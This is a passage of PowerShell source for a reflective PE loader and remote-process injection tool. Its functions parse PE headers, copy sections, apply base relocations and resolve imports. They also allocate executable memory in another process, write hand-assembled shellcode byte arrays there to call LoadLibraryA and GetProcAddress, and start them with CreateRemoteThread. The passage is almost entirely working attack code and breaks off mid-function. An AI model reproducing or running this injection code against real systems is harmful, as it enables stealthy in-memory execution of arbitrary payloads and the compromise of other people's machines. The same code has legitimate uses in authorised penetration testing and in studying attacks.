		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		#Write FunctionName to memory (will be used in GetProcAddress)
		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		#todo: need to have detection for when to get by ordinal
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
